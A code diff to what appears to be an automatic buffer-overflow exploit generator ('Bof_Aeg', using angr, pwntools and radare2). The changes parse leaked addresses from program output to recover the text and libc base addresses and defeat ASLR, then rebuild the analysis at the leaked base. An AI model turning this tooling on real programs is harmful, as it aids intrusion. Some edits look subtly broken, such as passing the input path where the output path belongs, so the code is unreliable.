@@ -59,8 +59,8 @@ class angr_gets(angr.SimProcedure):
             return dst
 
 class Bof_Aeg(object):
-    def __init__(self, filepath: str, elf: pwn.ELF, inputpath: str, outputpath: str, libpath: str, p):
-        self.project = angr.Project(filepath, load_options={'auto_load_libs': False}, main_opts={'base_addr': 0x555555554000})
+    def __init__(self, filepath: str, elf: pwn.ELF, inputpath: str, outputpath: str, libpath: str, p, base_addr=0x555555554000):
+        self.project = angr.Project(filepath, load_options={'auto_load_libs': False}, main_opts={'base_addr': base_addr})
         self.project.hook_symbol('gets',angr_gets())
         self.cfg = self.project.analyses.CFG(normalize=True)
         self.elf = elf
@@ -194,12 +194,14 @@ class Bof_Aeg(object):
         with open(self.outputpath,'rb') as f:
             data = f.read()
         map_data = json.loads(r2.cmd('dmj')) # List memmaps in JSON format
-        print(map_data)
-        if (b'0x55555' in data or b'\x55'*3 in data): # text leak
-            if b'0x555555' in data:
-                aid = data.index(b'0x555555')
-                leak = int(data[aid:aid+14],16)
-                recv_str = data[:aid]
+        # print(map_data)
+        
+        ## usally receives 6 bytes address in 'data'
+        if (b'0x' in data or b'\x55'*3 in data): # text leak, check if 0x555555 in data or not
+            if b'0x' in data:
+                aid = data.index(b'0x')
+                leak = int(data[aid:aid+14],16) # converts 6 bytes into int, include 0x
+                recv_str = data[:aid] # receive until address
                 recv_type = 'str'
             else:
                 aid = data.rindex(b'\x55'*3)
@@ -207,6 +209,7 @@ class Bof_Aeg(object):
                 recv_str = data[:aid-5]
                 recv_type = 'byte'
             debug_test_base = 0
+            debug_libc_base = 0
             for i in map_data:
                 if self.elf.path in i['name']:
                     if not debug_test_base: debug_test_base = i['addr']
@@ -215,19 +218,6 @@ class Bof_Aeg(object):
                         self.has_text_leak = True
                         self.text_offset = leak - debug_test_base
                         break
-        elif (b'0x7fff' in data or b'\xff\x7f' in data): # libc leak
-            if b'0x7fff' in data:
-                aid = data.index(b'0x7fff')
-                leak = int(data[aid:aid+14],16)
-                recv_str = data[:aid]
-                recv_type = 'str'
-            else:
-                aid = data.rindex(b'\xff\x7f')
-                leak = pwn.u64(data[aid-5:aid+1].ljust(8,b'\x00'))
-                recv_str = data[:aid-5]
-                recv_type = 'byte'
-            debug_libc_base = 0
-            for i in map_data:
                 if self.libpath in i['name']:
                     if not debug_libc_base: debug_libc_base = i['addr']
                     if i['addr'] <= leak and leak < i['addr_end']:
@@ -248,6 +238,9 @@ class Bof_Aeg(object):
         if self.has_text_leak:
             pwn.log.info("Found remote text leak :0x%x"%leak)
             self.text_base = leak - self.text_offset
+            self.elf.address = self.text_base
+            self.__init__(self.filepath, self.elf, self.inputpath, self.inputpath
+                          , self.libpath, self.p, self.text_base)
             pwn.log.info("text_base :0x%x"%self.text_base)
         elif self.has_libc_leak:
             pwn.log.info("Found remote libc leak :0x%x"%leak)
